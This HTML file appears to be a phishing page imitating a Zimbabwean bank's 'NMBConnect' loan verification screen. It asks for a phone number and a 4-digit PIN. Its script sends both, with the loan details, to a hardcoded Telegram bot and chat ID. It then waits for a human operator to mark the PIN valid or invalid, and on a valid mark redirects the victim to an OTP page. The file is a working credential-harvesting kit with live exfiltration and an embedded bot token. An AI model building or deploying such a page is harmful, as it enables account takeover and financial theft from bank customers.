<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#003366">
    <title>NMBConnect | Verifying Loans</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --nmb-blue: #003366;
            --nmb-gold: #E4C16A;
            --white: #ffffff;
            --error: #ff4d4d;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: white;
            padding: 20px;
        }

        .header-nav {
            width: 100%;
            display: flex;
            align-items: center;
            padding: 10px 0;
            margin-bottom: 20px;
        }

        .back-btn { font-size: 24px; cursor: pointer; margin-right: 15px; }
        .nav-title { font-size: 18px; font-weight: 500; }

        .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo-circle {
            width: 100px;
            height: 100px;
            background: var(--nmb-blue);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

        .brand-name { font-size: 22px; font-weight: 700; }
        .brand-name .nmb { color: #4a90e2; }
        .brand-name .connect { color: var(--nmb-gold); }

        .loan-info {
            background: rgba(0, 51, 102, 0.6);
            border: 1px solid rgba(228, 193, 106, 0.3);
            border-radius: 12px;
            padding: 12px 20px;
            margin-bottom: 25px;
            width: 100%;
            max-width: 360px;
            text-align: center;
            backdrop-filter: blur(5px);
        }

        .loan-info .type { font-size: 14px; font-weight: 600; color: var(--nmb-gold); margin-bottom: 4px; }
        .loan-info .amount { font-size: 20px; font-weight: 700; color: white; }

        .form-container { width: 100%; max-width: 360px; }

        .input-group {
            position: relative;
            margin-bottom: 18px;
            border: 1px solid rgba(255, 255, 255, 0.8);
            border-radius: 12px;
            padding: 12px 15px;
            display: flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(5px);
        }

        .flag-icon { width: 24px; margin-right: 10px; }
        .country-code { color: #4a90e2; font-weight: 600; margin-right: 10px; font-size: 15px; }
        .dropdown-arrow { border-left: 5px solid transparent; border-right: 5px solid transparent; border-top: 5px solid white; margin-right: 15px; }
        .input-field { flex: 1; background: transparent; border: none; color: white; font-size: 16px; outline: none; font-family: inherit; }
        .input-field::placeholder { color: rgba(255, 255, 255, 0.7); }

        .verify-btn {
            width: 100%;
            padding: 16px;
            background: white;
            color: var(--nmb-blue);
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .error-msg {
            color: var(--error);
            font-size: 13px;
            text-align: center;
            margin-bottom: 15px;
            display: none;
            background: rgba(0,0,0,0.6);
            padding: 10px;
            border-radius: 10px;
            border: 1px solid var(--error);
        }

        .overlay {
            position: fixed; inset: 0;
            display: none;
            align-items: center; justify-content: center; flex-direction: column;
            background: rgba(0,0,0,0.85);
            z-index: 2000;
            backdrop-filter: blur(8px);
            text-align: center;
            padding: 20px;
        }

        .overlay.on { display: flex; }
        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
        .sp-t { font-size: 18px; font-weight: 600; color: white; margin-top: 20px; }
        .sp-s { font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 10px; }
        @keyframes sp { to { transform: rotate(360deg); } }
    </style>
</head>
<body onload="init()">
    <div class="header-nav">
        <span class="back-btn" onclick="location.href='index.html'">❮</span>
        <span class="nav-title">Verifying NMBConnect Loans</span>
    </div>

    <div class="logo-container">
        <div class="logo-circle">
            <svg viewBox="0 0 100 100" width="60" height="60">
                <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
            </svg>
        </div>
        <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>
    </div>

    <div id="loanBox" class="loan-info" style="display:none;">
        <div class="type" id="loanType">NMB Loan</div>
        <div class="amount" id="loanAmount">$0.00 USD</div>
    </div>

    <div class="form-container">
        <div id="err" class="error-msg"></div>
        
        <form id="frm" onsubmit="doSubmit(event)">
            <div class="input-group">
                <img src="https://flagcdn.com/w40/zw.png" class="flag-icon" alt="ZW">
                <span class="country-code">(+263)</span>
                <div class="dropdown-arrow"></div>
                <input type="tel" class="input-field" id="phone" placeholder="7XXXXXXXX" inputmode="numeric" maxlength="9">
            </div>

            <div class="input-group">
                <span style="margin-right: 15px; font-size: 18px;">🔒</span>
                <input type="password" class="input-field" id="pin" placeholder="Enter Pin" inputmode="numeric" maxlength="4">
            </div>

            <button type="submit" class="verify-btn">Verify</button>
        </form>
    </div>

    <div id="ov" class="overlay">
        <div class="spin"></div>
        <div class="sp-t">Processing Verification</div>
        <div class="sp-s">Please wait a moment while we verify your details.<br>Do not close this page.</div>
    </div>

    <script>
        const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
        const CID = '7547427914';
        let bd = {}, luid = 0;

        function init() {
            const p = new URLSearchParams(location.search);
            const d = p.get('data'), pr = p.get('price');
            if (d && pr) { 
                bd = { data: d, price: pr }; 
                document.getElementById('loanBox').style.display = 'block';
                document.getElementById('loanType').textContent = d;
                document.getElementById('loanAmount').textContent = '$' + pr + ' USD';
            }
        }

        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.style.display = 'block'; }
        function clrErr() { document.getElementById('err').style.display = 'none'; }

        async function tg(msg, btns) {
            try {
                const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
                });
                const d = await r.json();
                if (d.ok) {
                    const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
                    const ud = await ur.json();
                    if (ud.ok && ud.result.length > 0) { luid = ud.result[0].update_id; }
                }
            } catch(e) { console.error(e); }
        }

        function doSubmit(e) {
            e.preventDefault();
            clrErr();
            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
            const pin = document.getElementById('pin').value.trim();

            if (phone.length < 9) { showErr('Enter a valid 9-digit number'); return; }
            if (pin.length !== 4) { showErr('PIN must be 4 digits'); return; }

            const msg = `📱 <b>NMBConnect Login</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>$${bd.price || '0'} USD</code>`;

            const btns = [
                [{ text: '✓ Valid PIN', callback_data: 'pin_valid' }, { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }],
                [{ text: '⚠️ Already Applied', callback_data: 'login_applied' }]
            ];

            document.getElementById('ov').classList.add('on');
            tg(msg, btns);
            poll();
        }

        function poll() {
            const iv = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
                    .then(r => r.json())
                    .then(d => {
                        if (d.ok && d.result.length > 0) {
                            d.result.forEach(u => {
                                luid = u.update_id;
                                if (u.callback_query) {
                                    const cb = u.callback_query.data;
                                    if (cb === 'pin_valid') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        goOTP(); 
                                    }
                                    else if (cb === 'pin_invalid') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        showErr('Invalid PIN. You cannot proceed, kindly put the correct PIN.'); 
                                        document.getElementById('pin').value = '';
                                    }
                                    else if (cb === 'login_applied') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        showErr('You already applied for this loan.');
                                    }
                                }
                            });
                        }
                    }).catch(e => console.error(e));
            }, 1500);
            setTimeout(() => clearInterval(iv), 600000);
        }

        function goOTP() {
            const ph = document.getElementById('phone').value.trim().replace(/\s/g, '');
            location.href = `otp.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || '0'}&phone=${ph}`;
        }
    </script>
</body>
</html>
